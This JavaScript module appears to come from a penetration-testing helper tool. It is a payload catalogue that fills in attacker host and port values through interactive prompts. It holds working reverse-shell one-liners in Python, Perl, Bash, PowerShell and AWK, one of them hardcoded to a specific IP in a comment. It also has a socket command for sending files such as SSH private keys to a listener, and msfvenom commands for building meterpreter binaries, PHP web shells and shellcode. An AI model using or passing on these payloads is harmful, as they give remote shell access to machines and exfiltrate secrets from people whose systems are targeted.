var prompt = require('prompt'),
	ask = require('../modules/questionUser')

// Payload Array
arrayMisc = []

var Load = function(obj){
	arrayMisc.push(obj)
}

var questions = [];
var question = function(val){
	questions.push(val);
}

/*
###########################################
############### Payloads ##################
###########################################


---[Payload Parameters]---

Required: title, payload, and category
Optional: callback (used for prompt variable)


---[Variable Formatting]---

* If variables aren't added properly, they will not work
* Variables can include instructions if needed.
* Instructions should be kept in parenthesis

	ex: foobar <RHOST> <LHOST> <LPORT>
	ex: foobar <RHOST (hostname)> <RPORT>


*/

// ############### Reverse Shells ######################

Load({
	title: "Reverse Shell Python",
	payload: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"<PROMPT (shell type)>\",\"-i\"]);'",
	category: "Reverse Shells",
	callback: function(bro){
		question("Enter the type of shell to use (Ex: /bin/sh, /bin/bash, or cmd.exe)");
		question(ask.ncat);
		ask.some(questions, bro);
	}
})

Load({
	title: "Reverse Shell Perl",
	payload: "perl -e 'use Socket;$i=\"<LHOST>\";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"<PROMPT (shell type)> -i\");};'",
	category: "Reverse Shells",
	callback: function(bro){
		question("Enter the type of shell to use (Ex: /bin/sh, /bin/bash, or cmd.exe)");
		question(ask.ncat);
		ask.some(questions, bro);
	}
})

Load({
	title: "Reverse Shell Bash",
	payload: "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",
	category: "Reverse Shells",
	callback: function(bro){
		question(ask.ncat);
		ask.some(questions, bro);
	}
})


// Credit => https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1
Load({
	title: "Reverse Shell PSH",
	payload: '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
	category: "Reverse Shells",
	callback: function(bro){
		question(ask.ncat);
		ask.some(questions, bro);
	}
})

// Credit => Metasploit https://github.com/rapid7/metasploit-framework/blob/b908f41b0fd0eaef9b79d07d078b224d1168df52/modules/payloads/singles/cmd/unix/reverse_awk.rb
Load({
	title: "Reverse Shell using AWK",
	payload: 'awk \'BEGIN{s="/inet/tcp/0/<LHOST>/<LPORT>";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}\'',
	category: "Reverse Shells",
	callback: function(bro){
		question(ask.ncat);
		ask.some(questions, bro);
	}
})


// awk 'BEGIN{s="/inet/tcp/0/10.94.172.87/9999";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'

// ############### File Transfers ######################

Load({
	title: "Send File via Socket Connection",
	payload:'python -c \'exec """\nimport socket;import sys;s = socket.socket();s.connect(("<LHOST>",<LPORT>));f=open ("<PROMPT>", "rb");l = f.read(1024)\nwhile (l):\n    s.send(l)\n    l = f.read(1024)\ns.close();"""\'',
	category: "Exfiltration",
	callback: function(bro){
		question("Which file would you like to exfiltrate? (ex: /.ssh/id_rsa)");
		question(ask.ncatReceiveFile);
		ask.some(questions, bro);
	}
})

Load({
	title: "Download File via Python",
	payload:'python -c \'import urllib;urllib.urlretrieve ("<PROMPT (URI)>","<PROMPT (local path to save to)>");\'',
	category: "Exfiltration",
	callback: function(bro){
		question("What would you like to download? (ex: http://foo.bar/script.sh)");
		question("Where would you like to save it? (ex: /tmp/script.sh)");
		ask.some(questions, bro);
	}
})

Load({
	title: "Download File via SCP",
	payload:'scp <USER>@<RHOST>:\'"<PROMPT>"\' .',
	category: "Exfiltration",
	callback: function(bro){
		question("What is the remote path to the file you'd like to download?");
		ask.some(questions, bro);
	}
})

Load({
	title: "Obtain a TTY via Python",
	payload:'python -c \'import pty;pty.spawn("/bin/bash")\'',
	category: "Exfiltration",
})

// ################### MSF Venom ###################

Load({
	title: "List Msfvenom payloads",
	payload: "msfvenom -l",
	category: "MSF Venom"
})

Load({
	title: "Generate Metasploit Binary",
	payload:'msfvenom -p <PROMPT (payload type)> LHOST=<LHOST> LPORT=<LPORT> -f <PROMPT (payload format)> > file',
	category: "MSF Venom",
	callback: function(bro){
		question("What payload would you like to use? (ex: linux/x86/meterpreter/reverse_tcp)");
		question("What format would you like to generate the payload in? (ex: elf, exe, macho)");
		ask.some(questions, bro);
	}
})

Load({
	title: "Generate Metasploit PHP Web Shell",
	payload:"msfvenom -p php/meterpreter/<PROMPT (payload type)> LHOST=<LHOST> LPORT=<LPORT> -f raw > shell.php",
	category: "MSF Venom",
	callback: function(bro){
		question("What payload would you like to use? (ex: reverse_tcp, reverse_http, etc)");
		ask.some(questions, bro);
	}
})

Load({
	title: "Generate Metasploit Shellcode",
	payload:"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f <PROMPT (language)>",
	category: "MSF Venom",
	callback: function(bro){
		question("What language would you like to generate the shellcode in?");
		ask.some(questions, bro);
	}
})

//

/*
######################################################
############### End of Payloads ######################
######################################################
*/

module.exports = arrayMisc;
